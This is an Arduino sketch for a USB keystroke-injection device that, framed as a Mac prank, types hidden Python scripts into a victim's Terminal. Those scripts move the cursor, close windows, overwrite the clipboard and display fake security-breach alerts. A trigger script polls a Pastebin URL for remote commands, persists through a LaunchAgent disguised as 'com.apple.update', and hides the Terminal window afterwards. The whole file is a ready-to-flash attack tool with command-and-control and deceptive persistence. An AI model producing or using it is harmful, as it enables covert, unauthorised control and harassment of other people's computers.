#include <Keyboard.h>

// Arduino Pro Micro / Leonardo — Mac Ultimate Prank
// !! Replace XXXXXXXX in this file with your own Pastebin raw ID before flashing !!
// See README.md for how to create your Pastebin.
//
// HOW IT WORKS:
//   1. Plug in — all 12 prank scripts are silently installed. Nothing happens yet.
//   2. Arduino is removed. Target has no idea.
//   3. Put a command in your Pastebin to trigger a prank remotely.
//
// PASTEBIN COMMAND FORMAT:
//   COMMAND          — uses default interval
//   COMMAND seconds  — runs every N seconds e.g. "MINIMISE 60"
//
// COMMANDS: ACTIVATE JIGGLE MINIMISE SOUND NOTIFY CLIPBOARD ZOOM
//           CAPS VOLUME CLOSE SPEECH DARK INVERT STOP

void typeln(const char* s) {
  Keyboard.print(s);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(120);
}

void setup() {
  Keyboard.begin();
  delay(5000);

  // Cmd+Space → Spotlight → Terminal
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();
  delay(1200);
  Keyboard.print("Terminal");
  delay(500);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(4000);

  // === 1. JIGGLE — Mouse teleporter /tmp/.j.py — default 60s ===
  typeln("cat>/tmp/.j.py<<'E'");
  typeln("import sys,subprocess,time,random");
  typeln("from Quartz import CGWarpMouseCursorPosition");
  typeln("N=int(sys.argv[1]) if len(sys.argv)>1 else 60");
  typeln("while 1:");
  typeln(" time.sleep(N)");
  typeln(" CGWarpMouseCursorPosition((random.randint(0,3840),random.randint(0,2160)))");
  typeln("E");

  // === 2. MINIMISE — Cmd+M /tmp/.w.py — default 180s ===
  typeln("cat>/tmp/.w.py<<'E'");
  typeln("import sys,subprocess,time");
  typeln("N=int(sys.argv[1]) if len(sys.argv)>1 else 180");
  typeln("while 1:");
  typeln(" time.sleep(N)");
  typeln(" subprocess.run(['osascript','-e','tell application \"System Events\" to keystroke \"m\" using {command down}'])");
  typeln("E");

  // === 3. SOUND — Random system sound /tmp/.s.py — default 60s ===
  typeln("cat>/tmp/.s.py<<'E'");
  typeln("import sys,subprocess,time,random,glob");
  typeln("N=int(sys.argv[1]) if len(sys.argv)>1 else 60");
  typeln("s=glob.glob('/System/Library/Sounds/*.aiff')");
  typeln("while 1:");
  typeln(" time.sleep(N)");
  typeln(" subprocess.run(['afplay',random.choice(s)])");
  typeln("E");

  // === 4. NOTIFY — Fake critical error notification /tmp/.n.py — default 180s ===
  typeln("cat>/tmp/.n.py<<'E'");
  typeln("import sys,subprocess,time,random");
  typeln("N=int(sys.argv[1]) if len(sys.argv)>1 else 180");
  typeln("t=['Critical Error','Security Warning','System Failure','Disk Error','Memory Fault','Network Breach']");
  typeln("m=['A critical system error has occurred','Suspicious activity detected on this Mac','macOS has stopped working correctly','Hard drive read error. Backup data immediately','RAM allocation failure. Restart required','Unauthorised remote access attempt blocked']");
  typeln("while 1:");
  typeln(" time.sleep(N)");
  typeln(" i=random.randint(0,5)");
  typeln(" subprocess.run(['osascript','-e','display notification \"'+m[i]+'\" with title \"'+t[i]+'\"'])");
  typeln("E");

  // === 5. CLIPBOARD — Replace clipboard /tmp/.c.py — default 45s ===
  typeln("cat>/tmp/.c.py<<'E'");
  typeln("import sys,subprocess,time,random");
  typeln("N=int(sys.argv[1]) if len(sys.argv)>1 else 45");
  typeln("m=['what did you copy','nice try','I already read that','that belongs to me now','clipboard accessed','did you mean to copy that']");
  typeln("while 1:");
  typeln(" time.sleep(N)");
  typeln(" subprocess.run(['bash','-c','echo \"'+random.choice(m)+'\" | pbcopy'])");
  typeln("E");

  // === 6. ZOOM — Cmd+= /tmp/.z.py — default 90s ===
  typeln("cat>/tmp/.z.py<<'E'");
  typeln("import sys,subprocess,time");
  typeln("N=int(sys.argv[1]) if len(sys.argv)>1 else 90");
  typeln("while 1:");
  typeln(" time.sleep(N)");
  typeln(" subprocess.run(['osascript','-e','tell application \"System Events\" to keystroke \"=\" using {command down}'])");
  typeln("E");

  // === 7. CAPS — Toggle caps lock /tmp/.k.py — default 60s ===
  typeln("cat>/tmp/.k.py<<'E'");
  typeln("import sys,subprocess,time");
  typeln("N=int(sys.argv[1]) if len(sys.argv)>1 else 60");
  typeln("while 1:");
  typeln(" time.sleep(N)");
  typeln(" subprocess.run(['osascript','-e','tell application \"System Events\" to key code 57'])");
  typeln("E");

  // === 8. VOLUME — Random output volume /tmp/.v.py — default 60s ===
  typeln("cat>/tmp/.v.py<<'E'");
  typeln("import sys,subprocess,time,random");
  typeln("N=int(sys.argv[1]) if len(sys.argv)>1 else 60");
  typeln("while 1:");
  typeln(" time.sleep(N)");
  typeln(" subprocess.run(['osascript','-e','set volume output volume '+str(random.randint(0,100))])");
  typeln("E");

  // === 9. CLOSE — Cmd+W /tmp/.x.py — default 240s ===
  typeln("cat>/tmp/.x.py<<'E'");
  typeln("import sys,subprocess,time");
  typeln("N=int(sys.argv[1]) if len(sys.argv)>1 else 240");
  typeln("while 1:");
  typeln(" time.sleep(N)");
  typeln(" subprocess.run(['osascript','-e','tell application \"System Events\" to keystroke \"w\" using {command down}'])");
  typeln("E");

  // === 10. SPEECH — 'say' command /tmp/.p.py — default 120s ===
  typeln("cat>/tmp/.p.py<<'E'");
  typeln("import sys,subprocess,time,random");
  typeln("N=int(sys.argv[1]) if len(sys.argv)>1 else 120");
  typeln("m=['Hi','Message from PC','Hi there','Hello','Can you hear me','I am your computer']");
  typeln("while 1:");
  typeln(" time.sleep(N)");
  typeln(" subprocess.Popen(['say',random.choice(m)])");
  typeln("E");

  // === 11. DARK — Toggle dark/light mode /tmp/.d.py — default 300s ===
  typeln("cat>/tmp/.d.py<<'E'");
  typeln("import sys,subprocess,time");
  typeln("N=int(sys.argv[1]) if len(sys.argv)>1 else 300");
  typeln("while 1:");
  typeln(" time.sleep(N)");
  typeln(" subprocess.run(['osascript','-e','tell app \"System Events\" to tell appearance preferences to set dark mode to not dark mode'])");
  typeln("E");

  // === 12. INVERT — Cmd+Option+Ctrl+8 /tmp/.r.py — default 300s ===
  typeln("cat>/tmp/.r.py<<'E'");
  typeln("import sys,subprocess,time");
  typeln("N=int(sys.argv[1]) if len(sys.argv)>1 else 300");
  typeln("while 1:");
  typeln(" time.sleep(N)");
  typeln(" subprocess.run(['osascript','-e','tell application \"System Events\" to keystroke \"8\" using {command down, option down, control down}'])");
  typeln("E");

  // === Pastebin trigger + LaunchAgent persistence /tmp/.t.py ===
  // Polls Pastebin every 5 min. Parses "COMMAND" or "COMMAND seconds".
  // Passes interval as argv[1] to the launched prank script.
  typeln("cat>/tmp/.t.py<<'E'");
  typeln("import subprocess,time,urllib.request,plistlib,os,pathlib,sys");
  typeln("la=os.path.expanduser('~/Library/LaunchAgents/com.apple.update.plist')");
  typeln("pathlib.Path(os.path.dirname(la)).mkdir(exist_ok=True)");
  typeln("if not os.path.exists(la):");
  typeln(" d={'Label':'com.apple.update','ProgramArguments':['/usr/bin/python3','/tmp/.t.py'],'RunAtLoad':True}");
  typeln(" open(la,'wb').write(plistlib.dumps(d))");
  typeln(" subprocess.run(['launchctl','load',la])");
  typeln("fs=['/tmp/.j.py','/tmp/.w.py','/tmp/.s.py','/tmp/.n.py','/tmp/.c.py','/tmp/.z.py','/tmp/.k.py','/tmp/.v.py','/tmp/.x.py','/tmp/.p.py','/tmp/.d.py','/tmp/.r.py']");
  typeln("URL='https://pastebin.com/raw/XXXXXXXX'"); // <-- replace XXXXXXXX with your Pastebin ID
  typeln("def g():");
  typeln(" try:return urllib.request.urlopen(URL,timeout=5).read().decode().strip()");
  typeln(" except:return ''");
  typeln("while True:");
  typeln(" t=g()");
  typeln(" parts=t.split()");
  typeln(" cmd=parts[0] if parts else ''");
  typeln(" iv=parts[1:2]");
  typeln(" if cmd=='STOP':");
  typeln("  subprocess.run(['launchctl','unload',la])");
  typeln("  os.remove(la)");
  typeln("  for f in fs:");
  typeln("   subprocess.run(['pkill','-f',f])");
  typeln("   os.path.exists(f) and os.remove(f)");
  typeln("  break");
  typeln(" if cmd=='ACTIVATE':");
  typeln("  for f in fs:subprocess.Popen(['python3',f]+iv)");
  typeln("  break");
  typeln(" if cmd=='JIGGLE':subprocess.Popen(['python3','/tmp/.j.py']+iv);break");
  typeln(" if cmd=='MINIMISE':subprocess.Popen(['python3','/tmp/.w.py']+iv);break");
  typeln(" if cmd=='SOUND':subprocess.Popen(['python3','/tmp/.s.py']+iv);break");
  typeln(" if cmd=='NOTIFY':subprocess.Popen(['python3','/tmp/.n.py']+iv);break");
  typeln(" if cmd=='CLIPBOARD':subprocess.Popen(['python3','/tmp/.c.py']+iv);break");
  typeln(" if cmd=='ZOOM':subprocess.Popen(['python3','/tmp/.z.py']+iv);break");
  typeln(" if cmd=='CAPS':subprocess.Popen(['python3','/tmp/.k.py']+iv);break");
  typeln(" if cmd=='VOLUME':subprocess.Popen(['python3','/tmp/.v.py']+iv);break");
  typeln(" if cmd=='CLOSE':subprocess.Popen(['python3','/tmp/.x.py']+iv);break");
  typeln(" if cmd=='SPEECH':subprocess.Popen(['python3','/tmp/.p.py']+iv);break");
  typeln(" if cmd=='DARK':subprocess.Popen(['python3','/tmp/.d.py']+iv);break");
  typeln(" if cmd=='INVERT':subprocess.Popen(['python3','/tmp/.r.py']+iv);break");
  typeln(" time.sleep(300)");
  typeln("E");

  // Install Quartz, launch trigger silently, hide Terminal window
  typeln("python3 -m pip install pyobjc-framework-Quartz -q;nohup python3 /tmp/.t.py&disown;osascript -e 'tell app \"Terminal\" to set miniaturized of every window to true'");
}
void loop() {}
